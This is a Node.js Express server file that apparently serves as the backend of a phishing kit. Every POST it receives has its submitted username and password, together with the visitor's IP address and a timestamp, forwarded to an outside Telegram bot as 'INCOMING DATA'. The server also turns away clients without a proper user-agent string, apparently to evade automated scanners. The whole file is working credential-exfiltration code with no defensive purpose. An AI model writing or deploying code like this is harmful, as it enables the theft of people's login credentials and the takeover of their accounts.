import express from "express";
import crypto from "crypto";
import dotenv from "dotenv";

dotenv.config();
const app = express();

/* ================= MIDDLEWARE ================= */
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

/* ================= UTIL ================= */
function getIP(req) {
  return req.headers["x-forwarded-for"]?.split(",")[0] || "unknown";
}

/* ================= GET TEST ================= */
app.get("/", (req, res) => {
  res.json({
    ok: true,
    service: "APINET",
    time: new Date().toISOString()
  });
});

/* ================= POST ================= */
app.post("/", async (req, res) => {
  try {
    const ip = getIP(req);
    const ua = req.headers["user-agent"] || "";

    if (!ua || ua.length < 5) {
      return res.status(403).json({ ok: false, reason: "invalid_ua" });
    }

    const { login, A, B } = req.body;
    if (!A || !B) {
      return res.status(400).json({ error: "Missing field" });
    }

    const user = A;
    const pass = B;

    /* ===== TELEGRAM ===== */
    if (process.env.BOT_TOKEN && process.env.CHAT_ID) {
      const msg = `🧨 *INCOMING DATA*

👤 user : \`${user}\`
🔐 pass : \`${pass}\`
🌍 IP   : \`${ip}\`
⏱ TIME : \`${new Date().toISOString()}\`

#APINET`;

      await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.CHAT_ID,
          text: msg,
          parse_mode: "Markdown"
        })
      });
    }

    const key = crypto.createHash("md5").update(user + pass).digest("hex");

    return res.json({
      ok: true,
      key,
      received: { login, user }
    });

  } catch (e) {
    console.error("CRASH:", e);
    return res.status(500).json({ error: "server_error" });
  }
});

/* ================= EXPORT ================= */
export default app;
